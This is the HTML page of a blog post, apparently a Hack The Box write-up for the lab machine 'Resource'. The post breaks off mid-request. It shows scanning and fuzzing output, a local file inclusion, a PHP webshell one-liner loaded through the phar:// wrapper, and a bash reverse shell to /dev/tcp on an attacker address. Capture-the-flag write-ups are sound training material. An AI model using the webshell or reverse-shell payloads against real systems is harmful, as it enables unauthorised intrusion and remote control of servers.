@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/11/22/hackthebox-resource/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewResource is a hard-difficulty linux machine from Hack The Box written by 0xdf. It initially deals with the phar:&#x2F;&#x2F; php wrapper abuse in order to exploit an LFI to RCE to get us on sy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Resource">
+<meta property="og:url" content="http://foued-saidi.tech/2024/11/22/Hackthebox-Resource/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewResource is a hard-difficulty linux machine from Hack The Box written by 0xdf. It initially deals with the phar:&#x2F;&#x2F; php wrapper abuse in order to exploit an LFI to RCE to get us on sy">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Resource/Resource.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Resource/web1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Resource/ticket.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Resource/ticket2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Resource/ticket3.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Resource/shell.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Resource/shell2.png">
+<meta property="article:published_time" content="2024-11-22T14:55:55.000Z">
+<meta property="article:modified_time" content="2024-11-23T16:01:53.006Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Resource/Resource.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Resource -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Resource</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-11-22 15:55:55</span>
+        <span class="mobile">2024-11-22 15:55:55</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-11-23 17:01:53</span>
+            <span class="mobile">2024-11-23 17:01:53</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Resource is a hard-difficulty linux machine from Hack The Box written by 0xdf. It initially deals with the phar:&#x2F;&#x2F; php wrapper abuse in order to exploit an LFI to RCE to get us on system. Then we can get access to the ticket DataBase and find credentials for a user there granting us access to the old SSH certificate signing key, which is still valid and providing us wih root privileges. After that, we can find a script that interacts with the IT API for generating SSH certs that we exploit by sigining an SSH key to get into the main server. That’ll give us the auth_principal_name to for the API and generate a cert for that user. Finally, we can run a bash script vulnerable to Bash Globbing to generate certificate in order to leak that key, and generate an SSH certificate that gives root access to the main server.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Resource/Resource.png"
+                      alt="Resource-info-card"
+                ><figcaption>Resource-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">231.118</span> </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-11-22</span> <span class="number">16</span>:<span class="number">03</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">231.118</span></span><br><span class="line">Host is up (<span class="number">0.45</span>s latency).</span><br><span class="line">Not shown: <span class="number">997</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh     OpenSSH <span class="number">9.2</span>p1 Debian <span class="number">2</span>+deb12u3 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> <span class="number">78</span>:<span class="number">1</span>e:<span class="number">3</span>b:<span class="number">85</span>:<span class="number">12</span>:<span class="number">64</span>:a1:f6:df:<span class="number">52</span>:<span class="number">41</span>:ad:<span class="number">8</span>f:<span class="number">52</span>:<span class="number">97</span>:c0 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> e1:<span class="number">1</span>a:b5:<span class="number">0</span>e:<span class="number">87</span>:a4:a1:<span class="number">81</span>:<span class="number">69</span>:<span class="number">94</span>:<span class="number">9</span>d:d4:d4:a3:<span class="number">8</span>a:f9 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp   open  http    nginx <span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://itrc.ssg.htb/</span><br><span class="line"><span class="number">2222</span>/tcp open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">10</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> f2:a6:<span class="number">83</span>:b9:<span class="number">90</span>:<span class="number">6</span>b:<span class="number">6</span>c:<span class="number">54</span>:<span class="number">32</span>:<span class="number">22</span>:ec:af:<span class="number">17</span>:<span class="number">04</span>:bd:<span class="number">16</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">0</span>c:c3:<span class="number">9</span>c:<span class="number">10</span>:f5:<span class="number">7</span>f:d3:e4:a8:<span class="number">28</span>:<span class="number">6</span>a:<span class="number">51</span>:ad:<span class="number">1</span>a:e1:bf (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">80.77</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have ssh open on port 22, a web application deployed on the default port 80 and a weird ssh service open on port 2222.</p>
+<p>Also port 80 is redirecting us to <code>http://itrc.ssg.htb</code> so let’s go ahead and add that entry to our <code>/etc/hosts</code> file and see what we have.</p>
+<h3 id="Web-Application-http-itrc-ssg-htb"><a href="#Web-Application-http-itrc-ssg-htb" class="headerlink" title="Web Application - http://itrc.ssg.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://itrc.ssg.htb/" >http://itrc.ssg.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>We see it’s a casual web app at start:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Resource/web1.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>It has a login and registration features, let’s create an account and see what we have. Upon creating an account, we can create some sort of tickets:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Resource/ticket.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>The url we used to access this resource is <code>http://itrc.ssg.htb/?page=create_ticket</code>, maybe we could abuse the <code>page</code> parameter to get to other endpoints&#x2F;functions&#x2F;files??<br>Let’s fuzz that parameter using <a class="link"   target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf" >ffuf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and see what we get:3</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Desktop\Tools\ffuf_2.<span class="number">0.0</span>_windows_amd64&gt; .\ffuf.exe <span class="literal">-w</span> ..\SecLists<span class="literal">-master</span>\SecLists<span class="literal">-master</span>\Discovery\Web<span class="literal">-Content</span>\raft<span class="literal">-medium-directories</span>.txt  <span class="literal">-u</span> <span class="string">&quot;http://itrc.ssg.htb/?page=FUZZ&quot;</span>  <span class="literal">-fs</span> <span class="number">3120</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://itrc.ssg.htb/?page=FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: C:\Users\0xkujen\Desktop\Tools\SecLists-master\SecLists-master\Discovery\Web-Content\raft-medium-directories.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 3120</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 1331, Words: 136, Lines: 26, Duration: 473ms]:00:02] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 2842, Words: 255, Lines: 45, Duration: 4076ms]:00:06] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: register</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 2709, Words: 239, Lines: 44, Duration: 3367ms]:00:06] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: login</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 2627, Words: 196, Lines: 39, Duration: 3090ms]:00:06] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: logout</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 2276, Words: 158, Lines: 35, Duration: 2006ms]0:00:10] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: db</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 2276, Words: 158, Lines: 35, Duration: 1526ms]0:00:14] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: index</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 1331, Words: 136, Lines: 26, Duration: 2693ms]0:00:46] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: dashboard</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [1309/30000] :: Job [1/1] :: 22 req/sec :: Duration: [0:01:04] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Local-File-Inclusion-to-RCE-http-itrc-ssg-htb"><a href="#Local-File-Inclusion-to-RCE-http-itrc-ssg-htb" class="headerlink" title="Local File Inclusion to RCE - http://itrc.ssg.htb"></a>Local File Inclusion to RCE - <a class="link"   target="_blank" rel="noopener" href="http://itrc.ssg.htb/" >http://itrc.ssg.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><p>Doing some further testing on the <code>page=</code> parameter, we try to include some random file as we can assume that the web app is hosted over <code>/var/www/itrc</code>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Resource/ticket2.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure><br>We’re back again to our create_ticket endpoint. </p>
+<p>Uploading an empty ZIP file we can see it has been uploaded to <code>http://itrc.ssg.htb/uploads/b04f3ee8f5e43fa3b162981b50bb72fe1acabb33.zip</code>.<br>After creating a ticket, we can still add a comment. Inspecting the incoming traffic we see a new <code>/api/create_comment.php</code> endpoint. Therefore I think that maybe the real endpoint for our <code>create_ticket</code> can be <code>/var/www/itrc/api/create_ticket</code>.<br>We test that and we see this error when navigating to <code>http://itrc.ssg.htb/?page=/var/www/itrc/api/create_ticket</code>:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Resource/ticket3.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>We get the error about session_start() which is a common issue in PHP application when the function is called multiple times, therefore we just called it again which confirms that we just found ourselves an LFI !! However, I couldn’t list any useful files.</p>
+<h5 id="PHAR-Deserialization-Remote-Code-Execution"><a href="#PHAR-Deserialization-Remote-Code-Execution" class="headerlink" title="PHAR Deserialization &#x3D;&gt; Remote Code Execution"></a>PHAR Deserialization &#x3D;&gt; Remote Code Execution</h5><p>Since we now have an LFI and we know that this is a PHP application, I thought about abusing php wrappers like <code>file://</code>, <code>phar://</code> etc..<br>Let’s try to make a malicious php code <code>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code> and zip it, upload it then include it using the <code>phar</code> wrapper and see what we got:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Resource/shell.png"
+                      alt="RCE"
+                ><figcaption>RCE</figcaption></figure></p>
+<p>We can see an error about our <code>cmd</code> parameter in our <code>shell.php</code> file.<br>We try and run a simple <code>id</code> command through <code>http://itrc.ssg.htb/?page=phar://uploads/8b611bcfa9eace994eee7a26d6d540dae76bfc85.zip/shell&amp;cmd=id</code>:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Resource/shell2.png"
+                      alt="RCE"
+                ><figcaption>RCE</figcaption></figure></p>
+<p>And we have RCE!!!</p>
+<p>Let’s get a shell now: (we first have to encode our payload)</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?page=phar://uploads/8b611bcfa9eace994eee7a26d6d540dae76bfc85.zip/shell&amp;cmd=/bin/bash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/10.10.x.x/9001+0&gt;%261&#x27;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>itrc.ssg.htb</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, 